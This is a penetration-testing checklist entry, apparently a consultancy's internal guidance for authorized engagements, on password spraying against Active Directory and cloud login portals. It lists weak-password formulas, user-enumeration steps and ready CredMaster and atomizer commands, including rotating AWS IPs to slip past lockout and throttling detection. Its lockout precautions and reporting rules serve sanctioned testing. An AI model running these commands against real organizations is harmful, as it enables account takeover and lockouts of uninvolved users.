{"default_url":null,"content":{"state":2,"taskInstructions":"<h2>Instructions</h2><br>Perform password guessing against Active Directory endpoints.<br><br><h3><b>Testing Guidance</b></h3><br>- Ask the client for their Active Directory password policy and review it prior to performing password spraying. Tailor the tool arguments as needed to ensure users are not being locked out. Treat clients with <i>Account lockout duration = 0</i> with special care since this means that if a user is locked, an admin must manually unlock it.<br>- Prior to spraying, obtain a list of potential users by completing the Reconnaissance: Employees section of the checklist.<br>- Make sure to use the correct domain when spraying.<br>- Test no more than two passwords per user per hour, or less depending on the organization's password policy.<br><br><h3><b>Passwords to Use</b></h3><br>Below is a list of password formulas that should be used during initial password guessing.<br><br>1.) Season year variations<br>You may need to try multiple years or seasons depending on when the test is executed. Alternatively, the month can also be used.<br><h3>Examples:</h3><br><code>Winter18! <br>Winter2018!<br></code><br>2.) Company name variations<br>In some cases company abbreviations are also used in passwords, or the industry.<br><h3>Examples:</h3><br><code>Company12, <br>Company12!<br>CompanyBank!<br>Companybank12<br></code><br>3.) Variations  of password commonly found during engagements.<br><h3>Examples:</h3><br><code>Abc12345<br>Password1<br></code><br>4.) Username as password.<br><br>5.) Blank password.<br><br><h3>Password list generating tool</h3><br>Alternatively, use a tool to build a short password list. This tool will generate lists of passwords that include seasons, months, common weak passwords, and passwords based on whatever keywords are passed to it.<br><br>1.) Download from GitHub.<br><code>git clone https://github.com/BarrelTit0r/password-spraying-list-generator<br></code><br>2.) Create a short list of keywords relevant to the company or region.<br><code>cat keywords.txt<br>Bigbank<br>Minnesota<br>Vikings<br></code><br>3.) Use the tool to generate a list.<br><code>python3 pwlist_generatory.py keywords.txt &gt; passwords.txt<br></code><br>4.) Depending on the password policy, it may be useful to trim down the list to meet length or complexity requirements.<br><code>pw-inspector -i passwords.txt -m 8 &gt; trimmed_passwords.txt<br></code><br><br><h3><b>Supplementing OSINT Lists</b></h3><br>If your list of usernames/emails gathered from OSINT is on the small side, consider supplementing it with additional names from the statistically-likely-usernames repository. Choose the list that matches the email/username format you've determined to be correct for the client, merge it with your OSINT list, and then deduplicate the list. The lists in the repo can have 50k+ names, so only supplement your list with a portion (500-1000) of additional names from the repository list. No need to password spray against 50k+ usernames.<br><br><a href='https://github.com/insidetrust/statistically-likely-usernames'>https://github.com/insidetrust/statistically-likely-usernames</a><br><br><h3><b>Target Common Interfaces</b></h3><br>Target common internet exposed interfaces that support Active Directory domain authentication. For example:<br><br>Web apps (Burp/CredMaster)<br>Outlook Web Access (OWA) (CredMaster/Metasploit/Silent Break Blogs)<br>Azure/O365 (CredMaster)<br>ADFS (CredMaster)<br>VPN  (Common Metasploit Modules)<br>AWS (Burp)<br><br><h3>Tools</h3><br><b>CredMaster (https://github.com/knavesec/CredMaster)</b><br><b><i>General Information:</i></b><br>CredMaster is the preferred tool for most password spraying scenarios. It contains a number of plugins that target different types of endpoints. It uses AWS Amazon API Gateway to randomize and rotate the origin IPs of the spraying traffic, making it more difficult for things like Azure Smart Lockout and other throttling detection engines to spot the password spray. <br><br>Some initial setup is required:<br>1. Create an IAM user in NetSPI's Services AWS account<br>2. Add the user to the ProxyGroup group<br>3. Generate an API key for the user and save the access key + secret access key in PasswordState<br><br>Once AWS API keys have been generated, they can be used on the command line when executing the tool.<br><br><b><i>Plugin Information</i></b><br>Suggested plugin commands are shown below, but the latest plugin information can always be obtained here: <a href='https://github.com/knavesec/CredMaster/wiki/Plugin-Overview'>https://github.com/knavesec/CredMaster/wiki/Plugin-Overview</a><br><br><i>O365Enum</i> <i>- Office365 User Enum</i><br>- Enumerates users on Managed Office365 instances using the &quot;login.microsoft.com&quot; URL method<br>- The script warns if throttling is detected<br>- Suggested command:<br><code>python3 credmaster.py --access_key {aws-access-key} --secret_access_key {aws-secret-access-key} --plugin o365enum -u {username-file} -a useragents.txt -o {output-file} --header &quot;X-NetSPI-ExPen: expen.support@netspi.com&quot;<br></code><br><i>GmailEnum- Gmail User Enumeration</i><br>- Enumerates users on GMail GSuite instances<br>- Suggested command:<br><code>python3 credmaster.py --access_key {aws-access-key} --secret_access_key {aws-secret-access-key} --plugin gmailenum -u {username-file} -a useragents.txt -o {output-file} --header &quot;X-NetSPI-ExPen: expen.support@netspi.com&quot;<br></code><br><i>OWA - Outlook Web Access</i><br>- Sprays an organization's on-prem OWA login portal<br>- Requires one additional argument, <code>--url</code><br>- On-prem OWA doesn't have any throttle detection/prevention, but lockouts can still occur<br>- Suggested command:<br><code>python3 credmaster.py --plugin owa --url https://{domain} -u {username-file} -p {password-file} -a useragents.txt -o {output-file} -t 15 -d 60 --passwordsperdelay 1 --header &quot;X-NetSPI-ExPen: expen.support@netspi.com&quot;<br></code><br><i>EWS - Exchange Web Services </i><br>- Sprays an organization's on-prem EWS login portal<br>- Requires one additional argument, <code>--url</code><br>- On-prem EWS doesn't have any throttle detection/prevention, but lockouts can still occur<br>- Suggested command:<br><code>python3 credmaster.py --plugin ews --url https://{domain} -u {username-file} -p {password-file} -a useragents.txt -o {output-file} -t 15 -d 60 --passwordsperdelay 1 --header &quot;X-NetSPI-ExPen: expen.support@netspi.com&quot;<br></code><br><i>ADFS - Active Directory Federation Services</i><br>- Sprays on-prem ADFS instances using the &quot;/adfs/ls/&quot; method.<br>- Requires one additional argument, --url<br>- Can employ Smart Lockout for password spraying<br>- Suggested command:<br><code>python3 credmaster.py --access_key {aws-access-key} --secret_access_key {aws-secret-access-key} --plugin adfs --url https://{adfs-domain} -u {username-file} -p {password-file} -a useragents.txt -o {output-file} -t 5 -j 20 -m 10 -d 60 --passwordsperdelay 1 --header &quot;X-NetSPI-ExPen: expen.support@netspi.com&quot;<br></code><br><i>O365 - Office365</i><br>- Sprays Office365 instances using the &quot;autodiscover-s.outlook.com&quot; URL method<br>- Throttle detection/prevention and/or IP blocking may occur<br>- Azure SmartLockout may apply to rate limit requests if not using rotating IPs<br>- Suggested command:<br><code>python3 credmaster.py --access_key {aws-access-key} --secret_access_key {aws-secret-access-key} --plugin o365 -u {username-file} -p {password-file} -a useragents.txt -o {output-file} -t 5 -j 20 -m 10 -d 60 --passwordsperdelay 1 --header &quot;X-NetSPI-ExPen: expen.support@netspi.com&quot;<br></code><br><i>MSOL - Microsoft Online</i><br>- Sprays managed Microsoft Online instances like Azure or a managed Office365 setup<br>- Only for managed instances (not Federated)<br>- Azure SmartLockout can apply to rate limit requests<br>- Suggested command:<br><code>python3 credmaster.py --access_key {aws-access-key} --secret_access_key {aws-secret-access-key} --plugin msol -u {username-file} -p {password-file} -a useragents.txt -o {output-file} -t 5 -j 20 -m 10 -d 60 --passwordsperdelay 1 --header &quot;X-NetSPI-ExPen: expen.support@netspi.com&quot;<br></code><br><i>AzureSSO - Azure AD Seamless SSO Endpoint</i><br>- Sprays Azure AD instances using the &quot;autologon.microsoftazuread-sso.com&quot; URL method<br>- Requires one additional argument, <code>--domain</code>, that specifies the target Tenant domain<br>- Azure Smart Lockout may apply to rate limit queries<br>- Tool should notify you if Smart Lockout is detected <br>- Suggested command:<br><code>python3 credmaster.py --access_key {aws-access-key} --secret_access_key {aws-secret-access-key} --plugin azuresso --domain {tenant-domain} -u {username-file} -p {password-file} -a useragents.txt -o {output-file} -t 5 -j 20 -m 10 -d 60 --passwordsperdelay 1 --header &quot;X-NetSPI-ExPen: expen.support@netspi.com&quot;<br></code><br><i>Okta - Okta Authentication Portal</i><br>- Sprays an organization's Okta login portal<br>- Requires one additional argument, <code>--url</code><br>- Prone to throttling, don't use more than a single thread<br>- Suggested command:<br><code>python3 credmaster.py --access_key {aws-access-key} --secret_access_key {aws-secret-access-key} --plugin okta --url https://{domain}.okta.com -u {username-file} -p {password-file} -a useragents.txt -o {output-file} -t 1 -j 60 -m 30 -d 60 --passwordsperdelay 1 --header &quot;X-NetSPI-ExPen: expen.support@netspi.com&quot;<br></code><br><br><b>TREVORSpray (https://github.com/blacklanternsecurity/TREVORspray)</b><br>- Recon tools + Cisco AnyConnect VPN module<br><br><b>SprayingToolkit (https://github.com/byt3bl33d3r/SprayingToolkit)</b><br>- Lync/Skype for Business + IMAP modules<br>- Examples:<br><code>python atomizer.py owa contoso.com --recon<br>python atomizer.py owa contoso.com 'Fall2018' emails.txt<br>python atomizer.py lync contoso.com 'Fall2018' emails.txt<br>python atomizer.py imap contoso.com 'Fall2018' emails.txt<br></code><br><b>CredKing (https://github.com/ustayready/CredKing)</b><br>- GMail module<br><br><h3><b>Tools for Validating Conditional Access Policies + MFA Implementations</b></h3><br>https://github.com/dafthack/MFASweep<br>https://github.com/thalpius/Microsoft-Azure-AD-Conditional-Access-Validator<br><br><br><h2><b>Reporting Requirements</b></h2><br>Show the user enumeration method, the Active Directory domain enumeration method, and the successful password guessing.<br><br><b>Please include the interface you guessed against, tool used, passwords used, and approximate time stamps as comments to this checklist item, e.g.</b><br><code><b>12/21/20 @ 2:55PM</b><br><b>Office365 via Atomizer</b><br><b>NetSPI2020!</b><br><b>NetSPI20!</b><br></code><br><b>Please also attach your list of usernames to the Documents section without showing in Track.</b><br>","references":[],"isTaskInstructionsVisible":true,"isCommentMandatory":false,"fields":[],"masterFinding":null}}